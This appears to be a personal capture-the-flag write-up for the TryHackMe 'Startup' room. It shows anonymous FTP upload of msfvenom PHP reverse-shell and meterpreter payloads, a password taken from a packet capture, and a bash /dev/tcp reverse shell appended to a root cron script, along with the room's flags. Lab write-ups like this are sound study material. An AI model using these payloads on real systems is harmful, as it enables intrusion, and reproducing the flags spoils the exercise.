# THM - Startup
**DATE:3/5/26**
**Difficulty:easy**
**IP:"10.114.154.180"**
**OS:Ubuntu Linux**
## 1 - Enumeration
### nmap port scan 
```sudo nmap -sV -sC -p- 10.114.154.180
```
__scan results:__
```21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
### logged to ftp 
```ftp 10.114.154.180```
anonymous account available , found 2 files one is an among us meme .jpg
and a "notice.txt" which i knew from that one of the staff members is called **Maya**

### running dir fuzzing using gobuster
found : 
```/files (Status: 301) [Size: 316] [--> http://10.114.154.180/files/]
```

## 2- exploitation 
/files directory is the same one as ftp/anonymous which is gonna allow me to execute files from the web server 

creating the payload : 
```msfvenom -p php/reverse_php LHOST=192.168.227.128 LPORT=4444 -f raw -o shell.php```

running nc listener : 
```nc -lvnp 4444```

uploading the shell : 
```put shell.php``` => in the ftp console
faced error 503 i didn't have writing permission , all i had to do is switch to the /ftp dir
- upload completed 

executing the shell via web ```http://10.114.154.180/files/shell.php```

```nexsis@nexsis:~/Desktop/thm/Startup$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.114.154.180 36888
```
nc console was unstable so switched the meterpreter 

```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.227.128 LPORT=4444 -f raw -o shell2.php```

```msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.227.128
set LPORT 4444
run```

uploaded and executed the shell like before , now i have meterpreter access ! 
stabilized my shell using ```python3 -c 'import pty; pty.spawn("/bin/bash")'```

### flag found : 
found a "recipe.txt" , ran ```cat recipe.txt``
output : ```Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```
flag = **love**

### Lateral Movement — www-data → lennie
- downloaded /incidents/suspicious.pcapng via meterpreter
- opened in Wireshark, followed TCP streams
- found cleartext password in stream: c4ntg3t3n0ughsp1c3
- ssh lennie@10.114.154.180 with found password

## 3 - Privilege Escalation
### Enumeration
- found planner.sh in lennie's home
- planner.sh calls /etc/print.sh
- /etc/print.sh owned by lennie, executed by root via cron

### Exploitation
- edited /etc/print.sh to add reverse shell
- echo "bash -i >& /dev/tcp/LHOST/5555 0>&1" >> /etc/print.sh
- nc -lvnp 5555
- waited for cron to trigger

### Result
- root shell

flag = **THM{f963aaa6a430f210222158ae15c3d76d}**


